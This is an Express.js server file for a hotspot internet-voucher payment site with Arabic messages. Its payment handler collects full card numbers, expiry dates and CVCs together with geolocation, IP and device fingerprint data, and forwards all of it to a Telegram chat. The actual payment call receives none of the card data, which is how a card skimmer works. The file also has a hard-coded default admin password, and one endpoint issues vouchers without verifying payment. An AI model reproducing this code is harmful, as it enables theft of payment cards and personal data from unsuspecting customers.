const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");
const multer = require("multer");
const fs = require('fs');
const axios = require("axios");
require("dotenv").config();

const { processPayment } = require("./pay");
const { sendTelegramMessage, handleTelegramCallback, sendTelegramFailNotification, sendVoucherWithCardImage } = require("./telegram");
const webhookRouter = require("./webhook");
const { disableUserQueue } = require("./mikrotik");
const { processPaymentAndCreateCard } = require("./mikrotikService");
const { generateCardImage } = require("./cardGenerator");
const { generateContributionHtmlPage } = require('./contributionMessages');
const { generateSuccessPageHtml } = require('./successPage'); 
const { generateFailPageHtml } = require('./failPage');       

const chatSupport = require('./chat_support');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "https://tales-pay.onrender.com";

const { BRANCH_NAMES } = require('./branches');

global.generatedCardsMap = global.generatedCardsMap || new Map();

chatSupport.initSocket(io);

const upload = multer();

const maintenanceFile = path.join(__dirname, 'maintenance_status.json');

function getMaintenanceEndTime() {
  try {
    if (fs.existsSync(maintenanceFile)) {
      const data = JSON.parse(fs.readFileSync(maintenanceFile, 'utf8'));
      return data.endTime || 0;
    }
  } catch (e) {
    console.error(e);
  }
  return 0;
}

setInterval(() => {
  const oneHourAgo = Date.now() - (60 * 60 * 1000);
  for (let [key, value] of global.generatedCardsMap.entries()) {
    if (value.createdAt && new Date(value.createdAt).getTime() < oneHourAgo) {
      global.generatedCardsMap.delete(key);
    }
  }
}, 30 * 60 * 1000);

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use((req, res, next) => {
  const currentTime = Date.now();
  const maintenanceEndTime = getMaintenanceEndTime();
  const isMaintenanceActive = maintenanceEndTime > currentTime;

  if (
    req.path === "/dev-panel-lock" ||
    req.path === "/api/maintenance/status" ||
    req.path === "/api/maintenance/set" ||
    req.path === "/api/maintenance/verify" ||
    req.path.startsWith("/api/") ||
    req.path.includes(".") 
  ) {
    return next();
  }

  if (maintenanceEndTime > 0 && currentTime >= maintenanceEndTime) {
    try {
      if (fs.existsSync(maintenanceFile)) {
        fs.unlinkSync(maintenanceFile);
      }
    } catch (e) {}
    return next();
  }

  if (isMaintenanceActive) {
    return res.sendFile(path.join(__dirname, "public", "maintenance.html"));
  }

  next();
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/dev-panel-lock", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "maintenance.html"));
});

app.get('/api/maintenance/status', (req, res) => {
  res.json({ endTime: getMaintenanceEndTime() });
});

app.post('/api/maintenance/verify', (req, res) => {
  const { password } = req.body;
  const adminPassword = process.env.MAINTENANCE_PASSWORD || "123456";

  if (password === adminPassword) {
    return res.json({ success: true, message: "تم التحقق بنجاح" });
  } else {
    return res.status(401).json({ success: false, message: "كلمة المرور غير صحيحة!" });
  }
});

app.post('/api/maintenance/set', (req, res) => {
  const { password, minutes } = req.body;
  const adminPassword = process.env.MAINTENANCE_PASSWORD || "123456";

  if (password !== adminPassword) {
    return res.status(401).json({ success: false, message: "كلمة المرور غير صحيحة!" });
  }

  try {
    if (minutes === 0) {
      if (fs.existsSync(maintenanceFile)) {
        fs.unlinkSync(maintenanceFile);
      }
      return res.json({ success: true, message: "تم إلغاء الصيانة وفتح الموقع!" });
    }

    const endTime = Date.now() + (minutes * 60 * 1000);
    fs.writeFileSync(maintenanceFile, JSON.stringify({ endTime }));
    return res.json({ success: true, endTime, message: `تم ضبط الصيانة لمدة ${minutes} دقيقة!` });
  } catch (e) {
    return res.status(500).json({ success: false, message: "خطأ أثناء حفظ الوقت." });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

function getClientPublicIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    req.ip ||
    "غير متوفر"
  );
}

app.post('/api/support/message', upload.single('image'), (req, res) => {
  chatSupport.handleClientMessage(req, res, chatSupport.sendSupportChatMessage);
});

app.get('/api/support/messages/:clientId', (req, res) => {
  const clientId = req.params.clientId;
  const messages = chatSupport.getStoredMessages(clientId);
  res.json({ success: true, messages });
});

app.post('/telegram-webhook', async (req, res) => {
  try {
    const update = req.body;

    if (update.callback_query) {
      const data = update.callback_query.data || "";
      if (data.startsWith("reply_") || data.startsWith("close_")) {
        await chatSupport.handleTelegramReply(update);
        return res.sendStatus(200);
      }
    }

    if (update.message && update.message.reply_to_message) {
      await chatSupport.handleTelegramReply(update);
      return res.sendStatus(200);
    }

    if (update.callback_query) {
      await handleTelegramCallback(update.callback_query);
    }

    if (update.message || update.edited_message) {
      await chatSupport.handleTelegramReply(update);
    }

    res.sendStatus(200);
  } catch (e) {
    console.error("❌ Telegram Webhook Error:", e.message);
    res.sendStatus(500);
  }
});

async function handlePaymentRequest(req, res) {
  try {
    const data = { ...req.query, ...req.body };
    const {
      phone, user_phone, phoneNumber, amount, payment_method, method,
      number, name, expiry, cvc, card_data, save_card, clientID, clientId,
      publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
      deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
      geoData, branch, branch_key
    } = data;

    if (!amount && Object.keys(data).length === 0) {
      return res.redirect("/");
    }

    const selectedMethod = payment_method || method || "waitPage";
    const rawBranch = branch || branch_key || "branch2";
    const selectedBranch = BRANCH_NAMES[rawBranch] ? rawBranch : "branch2";
    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.waitPage;

    const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
    const payAmount = amount || "5";

    const paymentPayload = {
      phone: userPhone,
      amount_cents: parseFloat(payAmount) * 100,
      payment_method: selectedMethod,
      branch: selectedBranch,
      branchName: branchDisplayName,
      card_data: {
        number: (card_data && card_data.number) || number || "غير مدخل",
        name: (card_data && card_data.name) || name || "غير مدخل",
        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
        save_card: save_card === "tokenize" || save_card === "نعم"
      },
      clientID: clientID || clientId || "غير متوفر",
      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
      lat: lat || (geoData && geoData.lat) || "غير متوفر",
      lon: lon || (geoData && geoData.lon) || "غير متوفر",
      city: city || (geoData && geoData.city) || "غير متوفر",
      country: country || (geoData && geoData.country) || "غير متوفر",
      battery: battery || batteryInfo || "غير متوفر",
      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
      deviceRAM: deviceRAM || "غير متوفر",
      cpuCores: cpuCores || "غير متوفر",
      deviceType: deviceType || "غير متوفر",
      screenSize: screenSize || "غير متوفر",
      userTimeZone: userTimeZone || "غير متوفر",
      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
    };

    if (typeof sendTelegramMessage === "function") {
      await sendTelegramMessage(paymentPayload, true);
    }

    const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);

    if (result.type === "redirect") {
      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
        return res.json({ payment_url: result.url });
      }
      return res.redirect(result.url);
    } else if (result.type === "html") {
      return res.send(result.content);
    } else {
      return res.redirect(`/success?branch=${selectedBranch}`);
    }
  } catch (err) {
    console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
    if (req.headers["content-type"]?.includes("application/json")) {
      return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
    }
    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
  }
}

app.get("/api/pay", handlePaymentRequest);
app.post("/api/pay", handlePaymentRequest);

app.get("/contribution-success", (req, res) => {
  const amount = req.query.amount || req.query.price || 150;
  const transactionId = req.query.tx || req.query.id || req.query.order || req.query.session_id || 'TRX-DEFAULT';
  const htmlContent = generateContributionHtmlPage(amount, transactionId);
  res.send(htmlContent);
});

app.get("/api/check-voucher/:txId", async (req, res) => {
  const txId = String(req.params.txId || "").trim();
  
  if (!txId || txId === "null" || txId === "undefined") {
    return res.json({ success: false, message: "رقم المعاملة غير صالح" });
  }

  if (global.generatedCardsMap && global.generatedCardsMap.has(txId)) {
    return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
  }

  try {
    let realTxId = txId;
    let amount = req.query.amount || "5";
    let queryBranch = req.query.branch || "main";
    let customerPhone = req.query.phone || "01000000000";

    // إذا كانت المعاملة قادمة من جلسة Xpay، يتم جلب رقم المعاملة الحقيقي (pi_...) من سيرفر Xpay
    if (txId.startsWith("cs_") || txId.length > 20) {
      const xpayRes = await axios.get(`https://api.xpay.app/checkout/sessions/${txId}`, {
        headers: { "Authorization": `Bearer ${process.env.XPAY_SECRET_KEY}` }
      });
      const sessionData = xpayRes.data;
      const isPaid = sessionData.status?.type === "complete" || sessionData.paymentStatus === "paid" || sessionData.status === "paid";
      
      if (!isPaid) {
        return res.json({ success: false, message: "جاري تأكيد عملية الدفع من البوابة..." });
      }

      const amountCents = sessionData.amountTotal || sessionData.lineItems?.[0]?.priceData?.unitAmount || 500;
      amount = parseFloat((amountCents / 100).toFixed(2));
      queryBranch = sessionData.metadata?.branch || queryBranch;
      customerPhone = sessionData.metadata?.phone || customerPhone;
      
      realTxId = sessionData.paymentIntentId || sessionData.payment_intent || sessionData.id || txId;
    }

    const branchName = BRANCH_NAMES[queryBranch] || BRANCH_NAMES.main;

    // توجيه المساهمات (أكبر من 100 جنيه) لصفحة المساهمة
    if (Number(amount) > 100) {
      const contributionPayload = {
        isContribution: true,
        amount: amount,
        transactionId: realTxId,
        branchKey: queryBranch,
        branchName: branchName,
        createdAt: new Date()
      };
      global.generatedCardsMap.set(txId, contributionPayload);
      global.generatedCardsMap.set(realTxId, contributionPayload);
      return res.json({ success: true, data: contributionPayload });
    }

    // إصدار كارت الإنترنت للباقات العادية برقم المعاملة الحقيقي
    const mikrotikResult = await processPaymentAndCreateCard(amount, queryBranch, realTxId);
    if (mikrotikResult.success && mikrotikResult.cardCode) {
      const cardCode = mikrotikResult.cardCode;
      const packageName = mikrotikResult.packageName || `باقة إنترنت بقيمة ${amount} جنيه`;

      const cardImageBuffer = await generateCardImage(cardCode, packageName, parseFloat(amount), realTxId, branchName);

      const cardPayload = {
        buffer: cardImageBuffer,
        code: cardCode,
        packageName: packageName,
        amount: parseFloat(amount),
        phone: customerPhone,
        branchKey: queryBranch,
        branchName: branchName,
        createdAt: new Date()
      };

      global.generatedCardsMap.set(txId, cardPayload);
      global.generatedCardsMap.set(realTxId, cardPayload);

      await sendTelegramMessage({
        id: realTxId,
        amount: amount,
        payment_method: "card",
        branch: queryBranch,
        branchName: branchName,
        voucher_code: cardCode,
        package_info: packageName,
        phone: customerPhone
      }, false);

      if (cardImageBuffer) {
        await sendVoucherWithCardImage({
          amount: parseFloat(amount),
          packageName: packageName,
          card: { code: cardCode },
          phone: customerPhone,
          transactionId: realTxId,
          branch: queryBranch,
          branchName: branchName
        }, cardImageBuffer);
      }

      console.log(`✅ [Success] تم إصدار الكارت برقم المعاملة الحقيقي (${realTxId}) وإرسال الإشعارات للتليجرام بنجاح.`);
      return res.json({ success: true, data: cardPayload });
    }
  } catch (err) {
    console.error("❌ خطأ في التحقق وتوليد الكارت عبر check-voucher:", err.response?.data || err.message);
  }

  return res.json({ 
    success: false, 
    message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." 
  });
});

app.post("/api/disable-queue", async (req, res) => {
  try {
    const { username, branch, branch_key, domain } = req.body;
    const targetBranch = branch || branch_key || "main";

    if (typeof disableUserQueue === "function") {
      const result = await disableUserQueue(username, targetBranch, domain);
      return res.json(result);
    }

    return res.json({ success: true, message: "تم استقبال الطلب" });
  } catch (err) {
    console.error("❌ خطأ في تعطيل الـ Queue:", err.message);
    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
  }
});

app.get("/success", (req, res) => {
  const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || req.query.session_id || "";
  const queryBranch = req.query.branch || req.query.shipping_method || "";
  
  const pageHtml = generateSuccessPageHtml(transactionId, NETWORK_URL, queryBranch);
  return res.send(pageHtml);
});

app.get("/fail", async (req, res) => {
  const errorMessage = req.query.data_message || req.query.error || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
  
  const failData = {
    transactionId: req.query.id || req.query.order || req.query.transaction_id || `FAIL_${Date.now()}`,
    phone: req.query.phone || req.query.user_phone || "غير محدد",
    amount: req.query.amount || req.query.price || "غير محدد",
    branchName: req.query.branch || "حكايات نت رئيسي",
    publicIP: getClientPublicIP(req)
  };

  sendTelegramFailNotification(errorMessage, failData).catch(err => {
    console.error("Failed to send telegram fail notification:", err);
  });

  const pageHtml = generateFailPageHtml(errorMessage);
  return res.send(pageHtml);
});

app.use("/", webhookRouter);

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
